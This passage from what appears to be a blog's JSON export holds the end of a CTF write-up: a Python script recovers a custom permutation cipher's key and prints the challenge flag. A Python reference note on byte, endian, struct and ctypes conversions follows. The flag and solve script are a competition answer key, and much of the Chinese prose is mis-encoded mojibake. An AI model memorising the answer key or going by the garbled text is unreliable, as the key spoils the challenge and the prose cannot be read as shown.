0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000003, 0x00000017, 0x0000004F, 0x00000050, 0x00000062, 0x0000007E, 0x00000091, 0x00000097, 0x000000B1, 0x000000E4, 0x000000E9, 0x000000EC, 0x000000FD, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000051, 0x00000057, 0x0000005E, 0x000000B3, 0x000000DC, 0x000000F1, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000002, 0x0000000C, 0x0000004B, 0x0000005A, 0x0000008D, 0x00000095, 0x000000B8, 0x000000DB, 0x000000EF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000019, 0x0000008B, 0x000000D8, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x0000001A, 0x0000006A, 0x0000007B, 0x000000B0, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x0000005E, 0x0000006B, 0x000000AB, 0x000000AF, 0x000000F5, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x0000001B, 0x00000058, 0x0000008C, 0x00000096, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000050, 0x000000B5, 0x000000E5, 0x000000FD, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000001, 0x00000007, 0x00000052, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x0000001D, 0x0000006D, 0x0000006F, 0x0000007C, 0x0000009F, 0x000000B7, 0x000000BE, 0x000000D4, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000027, 0x0000002B, 0x00000075, 0x00000089, 0x000000A3, 0x000000D0, 0x000000D4, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x0000002E, 0x000000CD, 0x000000F4, 0x000000FE, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x0000000C, 0x00000012, 0x00000042, 0x00000070, 0x00000075, 0x00000079, 0x00000097, 0x00000099, 0x000000BF, 0x000000CE, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000015, 0x0000007D, 0x00000088, 0x000000A3, 0x000000B8, 0x000000C9, 0x000000F1, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x0000001A, 0x0000001E, 0x00000052, 0x00000086, 0x000000AE, 0x000000D7, 0x000000E9, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x0000000D, 0x000000AD, 0x000000AF, 0x000000C0, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000008, 0x0000004D, 0x0000006C, 0x00000074, 0x00000076, 0x0000007A, 0x000000A9, 0x000000AE, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000000, 0x0000000C, 0x00000017, 0x0000001E, 0x00000024, 0x00000027, 0x00000064, 0x00000067, 0x000000CC, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000003, 0x0000003D, 0x00000084, 0x00000085, 0x000000CD, 0x000000EB, 0x000000F8, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000057, 0x00000084, 0x0000008A, 0x000000B6, 0x000000CD, 0x000000E9, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000002, 0x00000021, 0x0000002E, 0x0000003B, 0x00000073, 0x00000074, 0x000000A0, 0x000000E1, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000021, 0x00000033, 0x00000037, 0x00000067, 0x00000072, 0x000000A1, 0x000000CA, 0x000000E1, 0x000000FB, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000023, 0x00000038, 0x00000047, 0x00000048, 0x0000004B, 0x0000004C, 0x00000057, 0x00000059, 0x00000069, 0x00000090, 0x000000A0, 0x000000BA, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000031, 0x00000035, 0x0000003C, 0x00000093, 0x000000A1, 0x000000DE, 0x000000EE, 0x000000FD, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000003, 0x00000066, 0x0000008C, 0x00000091, 0x00000094, 0x000000A0, 0x000000B0, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000040, 0x0000007A, 0x00000096, 0x000000A4, 0x000000E0, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000030, 0x0000003D, 0x0000005A, 0x0000006C, 0x00000080, 0x000000E6, 0x000000ED, 0x000000F2, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000004, 0x00000019, 0x00000082, 0x00000088, 0x00000090, 0x00000094, 0x000000AC, 0x000000F9, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000022, 0x00000028, 0x0000003C, 0x0000006E, 0x00000079, 0x0000007E, 0x0000008E, 0x00000091, 0x00000099, 0x0000009D, 0x000000A0, 0x000000CC, 0x000000EC, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000008, 0x00000033, 0x00000082, 0x0000008C, 0x00000090, 0x000000AA, 0x000000BC, 0x000000F8, 0x000000FE, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000017, 0x00000049, 0x00000093, 0x000000C7, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000019, 0x00000047, 0x0000005B, 0x00000060, 0x00000065, 0x000000BD, 0x000000F2, 0x000000F5, 0x000000F6, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000020, 0x0000002B, 0x00000031, 0x00000047, 0x00000048, 0x00000051, 0x00000054, 0x00000064, 0x00000078, 0x000000A1, 0x000000A5, 0x000000B4, 0x000000C8, 0x000000EE, 0x000000FE, 0x00000005, 0x00000011, 0x0000004A, 0x0000005D, 0x00000076, 0x00000077, 0x000000FE, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000008, 0x0000006D, 0x0000009A, 0x000000A3, 0x000000CE, 0x000000DC, 0x000000E0, 0x000000E4, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000013, 0x0000001D, 0x0000003A, 0x00000046, 0x00000098, 0x0000009C, 0x000000E7, 0x000000F3, 0x000000F5, 0x000000F8, 0x000000FC, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x0000001E, 0x00000034, 0x0000003B, 0x00000046, 0x00000079, 0x000000A7, 0x000000B0, 0x000000C4, 0x000000E0, 0x000000E7, 0x000000F6, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000070, 0x00000087, 0x00000097, 0x0000009E, 0x000000A6, 0x000000FB, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x0000001C, 0x00000021, 0x0000002B, 0x00000039, 0x0000004A, 0x0000006C, 0x00000081, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000006, 0x00000041, 0x00000064, 0x0000007F, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000020, 0x00000022, 0x0000005C, 0x000000B0, 0x000000B6, 0x000000B9, 0x000000C2, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000014, 0x0000001E, 0x00000079, 0x00000092, 0x00000096, 0x000000BC, 0x000000C7, 0x000000DA, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000016, 0x00000046, 0x0000007D, 0x00000089, 0x000000D5, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000043, 0x0000004C, 0x0000006A, 0x0000007D, 0x0000007F, 0x0000008D, 0x000000C2, 0x000000F2, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000029, 0x00000045, 0x00000051, 0x00000069, 0x00000091, 0x000000B6, 0x000000EA, 0x000000F5, 0x000000FF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000011, 0x00000036, 0x00000038, 0x00000040, 0x0000005C, 0x00000099, 0x000000D1, 0x000000E9, 0x000000EE, 0x000000F9, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x0000004B, 0x00000058, 0x00000071, 0x00000084, 0x000000C6, 0x000000F3, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF]arr = np.array(_arr).reshape((4, 21, 15))S = list(range(256))with open('./cipher-release', 'rb') as f: src = f.read() src = list(src)with open('output', 'rb') as f: final = f.read() final = list(final)key = [[-1 for order in range(21)] for round in range(4)]for i in range(256): S[i] = final[src.index(i)] if len(np.argwhere(arr == i)) == 1: round, order_i, j = list(np.argwhere(arr == i)[0]) key[round][S[i] - i] = order_i # print(f\"round=&#123;round&#125;,order[&#123;S[i]-i&#125;]=&#123;order_i&#125;\")flag = b''for round in range(4): order = key[round] seed = 0 pre_order = list(range(21)) for i in range(21): j = pre_order.index(order[i]) pre_order[i], pre_order[j] = pre_order[j], pre_order[i] seed += math.factorial(20 - i) * (j - i) flag += seed.to_bytes(8, 'big')print(flag)# *ctf&#123;b0rIn9_67hdnm_cIph3ri_7292&#125;","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://oacia.dev/tags/ctf/"},{"name":"go","slug":"go","permalink":"https://oacia.dev/tags/go/"},{"name":"powershellæ··æ·†","slug":"powershellæ··æ·†","permalink":"https://oacia.dev/tags/powershell%E6%B7%B7%E6%B7%86/"},{"name":"rust","slug":"rust","permalink":"https://oacia.dev/tags/rust/"}]},{"title":"åœ¨pythonä¸­éšå¿ƒæ‰€æ¬²çš„æ“ä½œå˜é‡","slug":"åœ¨pythonä¸­éšå¿ƒæ‰€æ¬²çš„æ“ä½œå˜é‡","date":"2023-07-23T11:50:09.000Z","updated":"2023-12-21T11:03:27.800Z","comments":true,"path":"åœ¨pythonä¸­éšå¿ƒæ‰€æ¬²çš„æ“ä½œå˜é‡/","link":"","permalink":"https://oacia.dev/%E5%9C%A8python%E4%B8%AD%E9%9A%8F%E5%BF%83%E6%89%80%E6%AC%B2%E7%9A%84%E6%93%8D%E4%BD%9C%E5%8F%98%E9%87%8F/","excerpt":"","text":"åœ¨æ—¥å¸¸çš„é€†å‘è¿‡ç¨‹ä¸­ï¼Œæˆ‘å¸¸å¸¸ä¼šå› ä¸ºå„ç§æ•°å€¼å½¢å¼ä¸Šçš„è½¬æ¢è€Œç›¸å½“çº ç»“ï¼Œæ¯”å¦‚å¤§ç«¯ï¼Œå°ç«¯ï¼Œå­—èŠ‚è½¬å­—ç¬¦ä¸²ç­‰ç­‰ï¼Œè€Œä¸”ä¹Ÿååˆ†çš„æµªè´¹æ—¶é—´å»çº ç»“è¿™äº›ç»†ææœ«èŠ‚ä¸Šçš„äº‹æƒ…ï¼Œå°¤å…¶æ˜¯æ¯æ¬¡è¿˜å¾— google å»æœç´¢ç›¸å…³çš„ä»£ç ï¼Œæ‰€ä»¥æˆ‘å¿ƒæƒ³ä¸å…¶ç¢ç‰‡åŒ–çš„ä»æµè§ˆå™¨ä¸­å¾—åˆ°è‡ªå·±æƒ³è¦çš„ç­”æ¡ˆï¼Œä¸å¦‚å°†è¿™äº›ä»£ç æ•´ç†åˆ°è¿™ä¸€ç¯‡åšå®¢å†…ï¼Œä¾›æˆ‘æœªæ¥é‡åˆ°è¿™æ–¹é¢çš„å›°æ‰°æ—¶ï¼Œå¯ä»¥ç›´æ¥åœ¨è¿™é‡Œæ‰¾åˆ°ç­”æ¡ˆ. # æ•°æ®åŸºæœ¬ç±»å‹ ä¸€ä¸ªå­—èŠ‚ = 8 ä½ qword æ•°æ®ç±»å‹ä»…åœ¨ 64 ä½ç¨‹åºä¸­å­˜åœ¨ ç±»å‹ å­—èŠ‚æ•° ä½æ•° ida ä¸­çš„è¡¨ç¤ºå½¢å¼ ä¸¾ä¾‹ byte 1 8 db 0x12 word 2 16 dw 0x1234 dword 4 32 dd 0x12345678 qword 8 64 dq 0x1234567812345678 # æ•°æ®çš„å­˜å‚¨å½¢å¼ å‡è®¾æœ‰å¦‚ä¸‹ c ä»£ç : int a = 0x12345678 # å¤§ç«¯å­˜å‚¨ (Big-Endian) æ•°æ®çš„é«˜å­—èŠ‚å­˜å‚¨åœ¨ä½åœ°å€ä¸­ï¼Œæ•°æ®çš„ä½å­—èŠ‚å­˜å‚¨åœ¨é«˜åœ°å€ä¸­ï¼Œé¡ºåºå­˜å‚¨ æ ˆå†…çš„æ•°æ®çš„è¡¨ç¤ºå½¢å¼: åœ°å€ æ•°å€¼ 0x400001 12h 0x400002 34h 0x400003 56h 0x400004 78h # å°ç«¯å­˜å‚¨ (Little-Endian) æ•°æ®çš„é«˜å­—èŠ‚å­˜å‚¨åœ¨é«˜åœ°å€ä¸­ï¼Œæ•°æ®çš„ä½å­—èŠ‚å­˜å‚¨åœ¨ä½åœ°å€ä¸­ï¼Œé€†åºå­˜å‚¨ æ ˆå†…çš„æ•°æ®çš„è¡¨ç¤ºå½¢å¼: åœ°å€ æ•°å€¼ 0x400001 78h 0x400002 56h 0x400003 34h 0x400004 12h # åœ¨ IDA ä¸­å–å‡ºæ•°æ®çš„æŸä¸€ä½ å‡è®¾æœ‰å¦‚ä¸‹æ•°æ® a1=0x12345678 , åœ¨ IDA ä¸­å¯èƒ½ä¼šå‡ºç° HIBYTE , BYTE2 , BYTE1 , LOBYTE æ¥å–å‡ºä¸€ä¸ªæ•°æ®æŸä¸€ä½çš„å€¼ï¼Œå…¶å«ä¹‰å¦‚ä¸‹ ç¬¦å· å–å‡ºçš„å€¼ HIBYTE(a1) 0x12 BYTE2(a1) 0x34 BYTE1(a1) 0x56 LOBYTE(a1) 0x78 # æ•°å­— &amp;&amp; å­—èŠ‚ # æ•°å­— =&gt; å­—èŠ‚ # to_bytes(length: int,byteorder: str,*,signed: bool = ...) -> bytes# é»˜è®¤ signed=False, å³æ— ç¬¦å·æ•°è¡¨ç¤ºnum = 0xef1312cdbytes_big = num.to_bytes(4, 'big') # å¤§ç«¯æ¨¡å¼ï¼Œé¡ºåºå­˜å‚¨print(bytes_big) # b'\\x12\\xcd\\x13\\xef'bytes_little = num.to_bytes(4, 'little') # å°ç«¯æ¨¡å¼ï¼Œé€†åºå­˜å‚¨print(bytes_little) # b'\\xef\\x13\\xcd\\x12'# å­—èŠ‚ =&gt; æ•°å­— # from_bytes(bytes: Iterable[int] | SupportsBytes,byteorder: str,*,signed: bool = ...) -> int# é»˜è®¤ signed=False, å³æ— ç¬¦å·æ•°è¡¨ç¤ºbytes = b'\\xef\\x13\\x12\\xcd'num_big = int.from_bytes(bytes, 'big') # å¤§ç«¯æ¨¡å¼ï¼Œé¡ºåºå­˜å‚¨print(hex(num_big)) # 0xef1312cdnum_little = int.from_bytes(bytes, 'little') # å°ç«¯æ¨¡å¼ï¼Œé€†åºå­˜å‚¨print(hex(num_little)) # 0xcd1213ef# å­—ç¬¦ä¸² &amp;&amp; å­—èŠ‚ # å­—ç¬¦ä¸² =&gt; å­—èŠ‚ str = \"oacia\"byte = str.encode()print(byte)# b'oacia'# å­—èŠ‚ =&gt; å­—ç¬¦ä¸² byte = b'oacia'str = byte.decode()print(str)# oacia# åå…­è¿›åˆ¶å­—ç¬¦ä¸² &amp;&amp; å­—èŠ‚ # åå…­è¿›åˆ¶å­—ç¬¦ä¸² =&gt; å­—èŠ‚ import binascii# a2b_hex(__hexstr: str | bytes) -> byteshex_str = \"6f61636961\"hex_bytes = binascii.a2b_hex(hex_str)print(hex_bytes) # b'oacia'# å­—èŠ‚ =&gt; åå…­è¿›åˆ¶å­—ç¬¦ä¸² import binascii# b2a_hex(__data: bytes) -> byteshex_bytes = b'oacia'hex_str = binascii.b2a_hex(hex_bytes)print(hex_str) # b'6f61636961'# åˆ—è¡¨ &amp;&amp; å­—ç¬¦ä¸² # åˆ—è¡¨ =&gt; å­—ç¬¦ä¸² my_list = [0x6f, 0x61, 0x63, 0x69, 0x61]str = \"\".join(list(map(chr, my_list)))print(str)# oacia# å­—ç¬¦ä¸² =&gt; åˆ—è¡¨ str = \"oacia\"my_list = list(map(ord, str))print(my_list) # [111, 97, 99, 105, 97]# struct å¤„ç†å­—èŠ‚æµ å½“æˆ‘ä»¬ä» dump ä¸€å—å†…å­˜åï¼Œè‚¯å®šæ˜¯æƒ³è¦å† python è¯»å–å­—èŠ‚æµå¹¶è½¬æ¢æˆæŒ‡å®šæ•°å€¼å¤§å°çš„æ•°ç»„ (å¦‚ Int æ•°ç»„) çš„å½¢å¼ï¼Œè¿™å°±éœ€è¦ç”¨åˆ° struct æ¥å¤„ç† dump ä¸‹æ¥çš„å­—èŠ‚æµ struct æ¨¡å—ä¸­æœ€é‡è¦çš„ä¸‰ä¸ªå‡½æ•°æ˜¯ struct.pack() , struct.unpack() , struct.calcsize() struct.pack(format, v1, v2, ...) æŒ‰ç…§ç»™å®šçš„æ ¼å¼ (format)ï¼ŒæŠŠæ•°æ®å°è£…æˆå­—èŠ‚æµ (å®é™…ä¸Šæ˜¯ç±»ä¼¼äº c ç»“æ„ä½“çš„å­—èŠ‚æµ) struct.unpack(format, byte) æŒ‰ç…§ç»™å®šçš„æ ¼å¼ (fmt) è§£æå­—èŠ‚æµ byteï¼Œè¿”å›è§£æå‡ºæ¥çš„ tuple struct.calcsize(format) è®¡ç®—ç»™å®šçš„æ ¼å¼ (format) å ç”¨å¤šå°‘å­—èŠ‚çš„å†…å­˜ # format æ”¯æŒçš„æ ¼å¼ FORMAT C TYPE PYTHON TYPE STANDARD SIZE x pad byte no value c char string of length 1 1 b signed char integer 1 B unsigned char integer 1 ? _Bool bool 1 h short integer 2 H unsigned short integer 2 i int integer 4 I unsigned int integer 4 l long integer 4 L unsigned long integer 4 q long long integer 8 Q unsigned long long integer 8 f float float 4 d double float 8 s char[] string p char[] string P void * integer 4 ä¸€äº›éœ€è¦æ³¨æ„çš„ç‚¹ q å’Œ Q åªåœ¨æœºå™¨æ”¯æŒ 64 ä½æ“ä½œæ—¶æœ‰æ„æ€ æ¯ä¸ªæ ¼å¼å‰å¯ä»¥æœ‰ä¸€ä¸ªæ•°å­—ï¼Œè¡¨ç¤ºä¸ªæ•° s æ ¼å¼è¡¨ç¤ºä¸€å®šé•¿åº¦çš„å­—ç¬¦ä¸²ï¼Œ4s è¡¨ç¤ºé•¿åº¦ä¸º 4 çš„å­—ç¬¦ä¸²ï¼Œä½†æ˜¯ p è¡¨ç¤ºçš„æ˜¯ pascal å­—ç¬¦ä¸² P ç”¨æ¥è½¬æ¢ä¸€ä¸ªæŒ‡é’ˆï¼Œå…¶é•¿åº¦å’Œæœºå™¨å­—é•¿ç›¸å…³ æœ€åä¸€ä¸ªå¯ä»¥ç”¨æ¥è¡¨ç¤ºæŒ‡é’ˆç±»å‹çš„ï¼Œå  4 ä¸ªå­—èŠ‚ # å­—èŠ‚å¯¹é½æ–¹å¼ æˆ‘ä»¬å¯ä»¥é€šè¿‡æ·»åŠ å‰ç¼€æ¥æŒ‡å®šå­—èŠ‚æµæŒ‰ç…§ä½•ç§æ–¹å¼å¯¹é½ CHARACTER BYTE ORDER SIZE ALIGNMENT @ native native native = native standard none &lt; little-endian standard none &gt; big-endian standard none ! network (= big-endian) standard none # ä»£ç ç¤ºä¾‹ å‡è®¾æˆ‘ä»¬ä»å†…å­˜ä¸­ dump ä¸‹æ¥äº†å¦‚ä¸‹æ•°æ®ï¼Œå·²çŸ¥è¯¥å˜é‡æ˜¯ä»¥æ— ç¬¦å· Int ç±»å‹å­˜å‚¨åˆ°å†…å­˜ä¸­çš„ï¼Œå› ä¸ºåœ¨æ“ä½œç³»ç»Ÿä¸­æ•°æ®éƒ½æ˜¯å°ç«¯å­˜å‚¨ï¼Œæ‰€ä»¥å¯ä»¥å†™å‡ºå¦‚ä¸‹ä»£ç å¤„ç†å­—èŠ‚æµè§„å¾—åˆ°æ­£ç¡®çš„å˜é‡çš„å€¼ import structdata = [0x6f,0x4e,0x5f,0x59,0x30,0x55,0x5f,0x46,0x89,0x7b,0xa4,0xc3,0xc5,0xe3,0x78,0xb3,0xc3,0x92,0x87,0xb0,0x92,0x94,0xa4,0xd3]data = struct.unpack('&lt;6I',bytes(data))print(','.join(map(hex,list(data))))# 0x595f4e6f,0x465f5530,0xc3a47b89,0xb378e3c5,0xb08792c3,0xd3a49492å½“æˆ‘ä»¬åœ¨ IDA ä¸­é‡åˆ°æµ®ç‚¹æ•°æ—¶ï¼ŒåŒæ ·å¯ä»¥ä½¿ç”¨ struct åº“æ¥æŸ¥çœ‹åå…­è¿›åˆ¶æµ®ç‚¹æ•°å¯¹åº”çš„åè¿›åˆ¶å€¼ import structhex_float = b'\\x1f\\x85\\xebQ\\xb8\\x1e\\t@'float_num = struct.unpack('d',hex_float)#è¡¨ç¤º double ç±»å‹print(float_num)#(3.14,)# ctypes å®šä¹‰å˜é‡æ•°å€¼ç±»å‹ æˆ‘ä»¬çŸ¥é“åœ¨ python ä¸­æ˜¯æ²¡æœ‰æ‰€è°“çš„ int , char çš„æ¦‚å¿µçš„ï¼Œä½†æ˜¯åœ¨é€†å‘çš„è¿‡ç¨‹ä¸­ï¼Œå…ä¸äº†è¦å’Œè¿™äº› c è¯­è¨€æ•°æ®ç±»å‹æ‰“äº¤é“ï¼Œè¿™ä¸ªæ—¶å€™å°±éœ€è¦æˆ‘ä»¬ä½¿ç”¨ ctypes åº“æ¥ä½œä¸º Python å’Œ C ä¹‹é—´çš„æ¡¥æ¢ï¼Œæ¥å† python ä¸­å¯¹å˜é‡çš„æ•°å€¼ç±»å‹è¿›è¡Œå®šä¹‰ï¼Œè¿™æ ·æ‰ä¸ä¼šå¯¼è‡´ç§»ä½å³ç§»çš„æ—¶å€™å˜é‡æº¢å‡ºï¼Œå‡æ³•çš„æ—¶å€™å˜é‡çš„å€¼è¢«å–åˆ°äº†è´Ÿæ•°ç­‰ç­‰æˆ‘ä»¬ä¸å¸Œæœ›çœ‹åˆ°çš„æƒ…å†µå‘ç”Ÿ è¿™æ˜¯ä¸€ä¸ªä½¿ç”¨ ctypes è¿›è¡Œå¾ªç¯å³ç§» 16 ä½çš„ç®€å•ç¤ºä¾‹ï¼Œå¯ä»¥å‘ç°å³ä½¿å³ç§» 16 ä½ï¼Œå˜é‡çš„èŒƒå›´ä¾ç„¶æ²¡æœ‰è¶…å‡º uint import ctypes# ä½¿ç”¨ c_uint æ–¹æ³•å°† a å˜é‡å®šä¹‰ä¸º c è¯­è¨€ä¸­çš„ uint (æ— ç¬¦å·æ•´å‹), å¹¶èµ‹å€¼ 0x12345678a = ctypes.c_uint(0x12345678)# ä½¿ç”¨ value æ–¹æ³•è¯»å– a å˜é‡çš„å€¼ å¾ªç¯å‘å³ç§»åŠ¨ 16 ä½a = ctypes.c_uint((a.value&lt;&lt;16) | (a.value>>16))print(hex(a.value)) # 0x56781234ctypes ä¸­é—´ç±»å‹ï¼ŒC ç±»å‹å’Œ python ç±»å‹å¯¹åº”å…³ç³»å¦‚ä¸‹è¡¨ï¼š ctypes ç±»å‹ C ç±»å‹ Python ç±»å‹ c_bool _Bool bool c_char char å•å­—ç¬¦å­—èŠ‚ä¸²å¯¹è±¡ c_wchar wchar_t å•å­—ç¬¦å­—ç¬¦ä¸² c_byte char int c_ubyte unsigned char int c_short short int c_ushort unsigned short int c_int int int c_uint unsigned int int c_long long int c_ulong unsigned long int c_longlong __int64 æˆ– long long int c_ulonglong unsigned __int64 æˆ– unsigned long long int c_size_t size_t int c_ssize_t ssize_t æˆ– Py_ssize_t int c_time_t time_t int c_float float float c_double double float c_longdouble long double float c_char_p char* (ä»¥ NUL ç»“å°¾) å­—èŠ‚ä¸²å¯¹è±¡æˆ– None c_wchar_p wchar_t* (ä»¥ NUL ç»“å°¾) å­—ç¬¦ä¸²æˆ– None c_void_p void* int æˆ– None","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://oacia.dev/tags/python/"}]},{"title":"HWS2023å¤ä»¤è¥CTFé€‰æ‹”èµ›writeup","slug":"hws-2023","date":"2023-07-17T03:26:21.000Z","updated":"2023-09-01T05:32:48.740Z","comments":true,"path":"hws-2023/","link":"","permalink":"https://oacia.dev/hws-2023/","excerpt":"","text":"hws 